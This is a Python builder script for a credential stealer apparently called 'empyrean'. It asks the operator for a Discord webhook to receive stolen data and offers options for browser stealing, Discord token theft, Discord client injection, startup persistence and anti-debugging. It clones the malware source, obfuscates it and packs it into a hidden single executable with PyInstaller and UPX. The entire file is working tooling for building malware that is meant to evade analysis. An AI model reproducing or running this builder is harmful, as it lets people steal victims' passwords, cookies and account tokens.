import ast
import os
import re
import shutil
import subprocess
import traceback
import zipfile

import colorama
import pyobf2.lib as obf
import requests
from InquirerPy import prompt  # type: ignore
from rich.progress import (BarColumn, Progress, SpinnerColumn, TextColumn,
                           TimeElapsedColumn)


class Config:
    """
    The Config class creates the questions that will be prompted to the user
    and return the configuration data
    """

    def __init__(self) -> None:
        self.questions = [
            {
                "type": "input",
                "name": "webhook",
                "message": "Enter your webhook URL",
                "validate": (lambda x: False if re.match(r"https://(discord.com|discordapp.com)/api/webhooks/\d+/\S+", x) is None else True)
            },
            {
                "type": "confirm",
                "name": "antidebug",
                "message": "Enable anti-debugging?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "browsers",
                "message": "Enable browser stealing?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "discordtoken",
                "message": "Enable Discord token stealing?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "injection",
                "message": "Enable Discord injection?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "startup",
                "message": "Enable startup?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "systeminfo",
                "message": "Enable system info?",
                "default": True,
            },
        ]

    def get_config(self) -> dict:
        """
        Prompt the user with the questions and return the config data
        """
        return prompt(self.questions)


class MakeEnv:
    """
    The MakeEnv class creates the build directory and clones the source code
    """

    def __init__(self) -> None:
        self.build_dir = os.path.join(os.getcwd(), 'build')

    def make_env(self) -> None:
        """
        Creates the build directory
        """
        if os.path.exists(self.build_dir):
            shutil.rmtree(self.build_dir)

        os.mkdir(self.build_dir)

    def get_src(self) -> None:
        """
        Clones the source code from a specified repository into the build directory
        """
        subprocess.run(
            ['git', 'clone', 'https://github.com/addi00000/empyrean.git'], cwd=self.build_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        shutil.move(os.path.join(self.build_dir,
                    'empyrean', 'src'), self.build_dir)


class WriteConfig:
    """
    The WriteConfig class writes the config data to the config file
    """

    def __init__(self, config: dict) -> None:
        self.config = config
        self.build_dir = os.path.join(os.getcwd(), 'build')
        self.config_file = os.path.join(self.build_dir, 'src', 'config.py')

    def write_config(self) -> None:
        """
        Writes the config data to the config file
        """
        with open(self.config_file, 'w') as f:
            f.write(f'__CONFIG__ = {self.config}')


class DoObfuscate:
    """
    Obfuscate code using https://github.com/0x3C50/pyobf2
    """

    def __init__(self) -> None:
        self.build_dir = os.path.join(os.getcwd(), 'build')
        self.src_dir = os.path.join(self.build_dir, 'src')
        self.config = {
            "removeTypeHints.enabled": True,
            "fstrToFormatSeq.enabled": True,
            "intObfuscator.enabled": True,
            "intObfuscator.mode": "decode",
            "encodeStrings.enabled": True,
            "renamer.enabled": False,
            "renamer.rename_format": "f'{kind}{get_counter(kind)}'",
            "replaceAttribSet.enabled": True,
            "unicodeTransformer.enabled": True,
        }

    def walk(self, path: str) -> dict:
        """
        Walk a directory and return a dict of files
        """
        files = {}
        for root, _, filenames in os.walk(path):
            for filename in filenames:
                files[os.path.join(root, filename)] = os.path.join(
                    root, filename).replace(path, '')
        return files

    def run(self) -> None:
        """
        Run the obfuscation
        """
        obf.set_config_dict(self.config)

        tree = self.walk(self.src_dir)
        for file in tree:
            if file.endswith('.py'):
                with open(file, 'r', encoding='utf-8') as f:
                    code = f.read()
                tree[file] = ast.parse(code)
                tree[file] = obf.do_obfuscation_single_ast(
                    tree[file], tree[file])
                with open(file, 'w', encoding='utf-8') as f:
                    f.write(ast.unparse(tree[file]))


class Build:
    """
    The Build class downloads and installs the necessary packages and
    then builds the source code
    """

    def __init__(self) -> None:
        self.build_dir = os.path.join(os.getcwd(), 'build')
        self.dist_dir = os.path.join(self.build_dir, '..', 'dist')

    def get_pyinstaller(self) -> None:
        """
        Downloads pyinstaller package
        """
        url = 'https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v5.1.zip'

        with requests.get(url, stream=True) as r:
            with open(os.path.join(self.build_dir, 'pyinstaller.zip'), 'wb') as f:
                shutil.copyfileobj(r.raw, f)
        with zipfile.ZipFile(os.path.join(self.build_dir, 'pyinstaller.zip'), 'r') as zip_ref:
            zip_ref.extractall(self.build_dir)

    def get_upx(self) -> None:
        """
        Downloads UPX package
        """
        url = 'https://github.com/upx/upx/releases/download/v3.96/upx-3.96-win64.zip'

        with requests.get(url, stream=True) as r:
            with open(os.path.join(self.build_dir, 'upx.zip'), 'wb') as f:
                shutil.copyfileobj(r.raw, f)
        with zipfile.ZipFile(os.path.join(self.build_dir, 'upx.zip'), 'r') as zip_ref:
            zip_ref.extractall(self.build_dir)

    def build(self) -> None:
        """
        Builds the source code using pyinstaller and UPX
        """
        subprocess.run(['pyinstaller', '--onefile', '--noconsole', '--clean', '--distpath', self.dist_dir, '--workpath', os.path.join(
            self.build_dir, 'work'), '--specpath', os.path.join(self.build_dir, 'spec'), '--upx-dir', os.path.join(self.build_dir, 'upx-3.96-win64'), os.path.join(self.build_dir, 'src', 'main.py')], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def main() -> None:
    colorama.init()

    progress = Progress(
        TextColumn("[bold blue]{task.description}", justify="right"),
        BarColumn(bar_width=None),
        SpinnerColumn(
            spinner_name="monkey", style="bright_yellow", speed=1.0),
        TimeElapsedColumn()
    )

    config = Config()
    config_data = config.get_config()

    with progress:
        task1 = progress.add_task("[bold green]Making environment...", total=1)
        make_env = MakeEnv()
        make_env.make_env()
        make_env.get_src()
        progress.update(task1, advance=1)

        task2 = progress.add_task("[bold green]Writing config...", total=1)
        write_config = WriteConfig(config_data)
        write_config.write_config()
        progress.update(task2, advance=1)

        task3 = progress.add_task("[bold green]Obfuscating...", total=1)
        do_obfuscate = DoObfuscate()
        do_obfuscate.run()
        progress.update(task3, advance=1)

        task4 = progress.add_task("[bold green]Building...", total=1)
        build = Build()
        build.get_pyinstaller()
        build.get_upx()
        build.build()
        progress.update(task4, advance=1)

    print('Done!')


if __name__ == '__main__':
    main()
